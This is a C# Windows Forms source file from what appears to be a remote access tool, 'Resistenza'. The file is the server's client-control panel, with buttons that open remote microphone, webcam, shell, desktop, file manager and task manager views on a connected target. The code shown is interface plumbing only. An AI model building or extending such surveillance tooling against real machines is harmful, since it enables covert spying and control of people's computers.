using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Management.Automation;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Runtime.InteropServices;

using Resistenza.Server.Networking;
using System.Reflection.Emit;
using Label = System.Windows.Forms.Label;

namespace Resistenza.Server.Forms
{


    public partial class FrmActions : Form
    {

        private ConnectedClient _TargetClient;
        private Form _CurrentlyOpenForm;
        private Color _ClickedBtnColor = Color.FromArgb(18, 16, 27);

        public delegate void OnClientConnectionDeath(object Sender, ConnectedClient DeadClient);
        public event OnClientConnectionDeath ClientConnectionDied;

        public const int WM_NCLBUTTONDOWN = 0xA1;
        public const int HT_CAPTION = 0x2;

        [DllImportAttribute("user32.dll")]
        public static extern int SendMessage(IntPtr hWnd,
                         int Msg, int wParam, int lParam);
        [DllImportAttribute("user32.dll")]
        public static extern bool ReleaseCapture();

        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        public FrmActions(ConnectedClient TargetClient)
        {
            InitializeComponent();
            // CustomizeDesign();

            _TargetClient = TargetClient;

            this.MinimizeBox = false;
            this.MaximizeBox = false;

            _TargetClient.ConnectionDied += _TargetClient_ConnectionDied;

            this.Padding = new Padding(2);
            this.BackColor = Color.FromArgb(51, 20, 98);

            string Title = "Client Manager";

            string ClientLabelText = $"({TargetClient.IpAddress})";
            int x_clientlabel = MenuLabel.Left + (MenuLabel.Width - ClientAddressLabel.Width) / 2 - (TextRenderer.MeasureText(ClientLabelText, ClientAddressLabel.Font).Width / 2);

            ClientAddressLabel.Location = new System.Drawing.Point(
                 x_clientlabel,
                 MenuLabel.Bottom + 10 // Spazio tra le due label
            );

            ClientAddressLabel.TextAlign = ContentAlignment.MiddleCenter;
            ClientAddressLabel.Text = ClientLabelText;


            while (CheckLabelOverflow(ClientAddressLabel, TitlePanel, 5))
            {
                float CurrentSize = ClientAddressLabel.Font.Size;
                string familynameCurrent = ClientAddressLabel.Font.FontFamily.Name;
                ClientAddressLabel.Font = new Font(familynameCurrent, CurrentSize - 1);
                
            }

            ClientAddressLabel.BringToFront();





        }

        private void OpenNewForm(Form FormToOpen)
        {
            if (_CurrentlyOpenForm != null)
            {
                _CurrentlyOpenForm.Close();

            }

            _CurrentlyOpenForm = FormToOpen;
            FormToOpen.TopLevel = false;
            FormToOpen.FormBorderStyle = FormBorderStyle.None;
            FormToOpen.Dock = DockStyle.Fill;
            this.ActionsPanel.Controls.Add(FormToOpen);
            this.ActionsPanel.Tag = FormToOpen;
            FormToOpen.BringToFront();
            FormToOpen.Show();


        }

        private void _TargetClient_ConnectionDied(object? sender, EventArgs e)
        {
            throw new NotImplementedException();
        }

        private void HideSubmenu()
        {
            if (SurveillanceSubpanel.Visible)
            {
                SurveillanceSubpanel.Visible = false;
                SurveillanceBtn.BackColor = SystemBtn.BackColor; //resetto il colore originale
            }
            if (SystemSubpanel.Visible)
            {
                SystemSubpanel.Visible = false;
                SystemSubpanel.BackColor = SurveillanceBtn.BackColor;
            }
        }

        private void OnChildFormRaisingConnectionDeath(object sender, EventArgs e)
        {
            ClientConnectionDied?.Invoke(this, _TargetClient);
        }


        private async void FrmActions_Load(object sender, EventArgs e)
        {
            SystemInfoFrm InfoForm = new SystemInfoFrm(_TargetClient);
            OpenNewForm(InfoForm);
        }

        private void SurveillanceBtn_Click(object sender, EventArgs e)
        {
            HideSubmenu();
            SurveillanceSubpanel.Visible = true;

        }

        private void SystemBtn_Click(object sender, EventArgs e)
        {
            HideSubmenu();
            SystemSubpanel.Visible = true;

        }

        private void topPanel_MouseDown(object sender, MouseEventArgs e)
        {
            if (GetForegroundWindow() != this.Handle)
            { //se la finestra principale non è in primo piano, la riportiamo in primo piano

                this.WindowState = FormWindowState.Minimized;
                this.Show();
                this.WindowState = FormWindowState.Normal;
            }

            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
            }
        }

        private void MicrophoneBtn_Click(object sender, EventArgs e)
        {
            FrmRemoteMic RemoteMicrophone = new FrmRemoteMic(_TargetClient);
            OpenNewForm(RemoteMicrophone);
            HideSubmenu();
        }

        private void WebcamBtn_Click(object sender, EventArgs e)
        {
            FrmRemoteCam RemoteCam = new FrmRemoteCam(_TargetClient);
            OpenNewForm(RemoteCam);
            HideSubmenu();
        }

        private void RemoteShellBtn_Click(object sender, EventArgs e)
        {
            FrmRemoteShell RemoteShell = new FrmRemoteShell(_TargetClient);
            OpenNewForm(RemoteShell);
            HideSubmenu();
        }

        private void SystemInfoFormBtn_Click(object sender, EventArgs e)
        {
            SystemInfoFrm SystemInformation = new SystemInfoFrm(_TargetClient);
            OpenNewForm(SystemInformation);
            HideSubmenu();
        }

        private void FilesManagerBtn_Click(object sender, EventArgs e)
        {
            FrmFileManager FileManager = new FrmFileManager(_TargetClient);
            OpenNewForm(FileManager);
            HideSubmenu();
        }

        private void TaskManagerBtn_Click(object sender, EventArgs e)
        {
            FrmTaskManager Taskmgr = new FrmTaskManager(_TargetClient);
            OpenNewForm(Taskmgr);
            HideSubmenu();
        }
        private bool CheckLabelOverflow(Label label, Panel panel, int MinimumDistance = 0)
        {
            using (Graphics g = label.CreateGraphics())
            {
                SizeF size = g.MeasureString(label.Text, label.Font);

                // Calcola la posizione finale del testo della Label
                float labelRightEdge = label.Location.X + label.Size.Width;

                // Calcola la posizione finale del bordo del pannello
                float panelRightEdge = panel.Location.X + panel.Width;

                // Controlla se il bordo destro del testo eccede il pannello, tenendo conto di MinimumDistance
                if (labelRightEdge + MinimumDistance > panelRightEdge)
                {
                    return true;
                }
                else
                {
                    return false;
                }
            }
        }

        private void RemoteDesktopBtn_Click(object sender, EventArgs e)
        {
            FrmRemoteDesktop RemoteDesktop = new FrmRemoteDesktop(_TargetClient);
            OpenNewForm(RemoteDesktop);
            HideSubmenu();
        }
    }

}
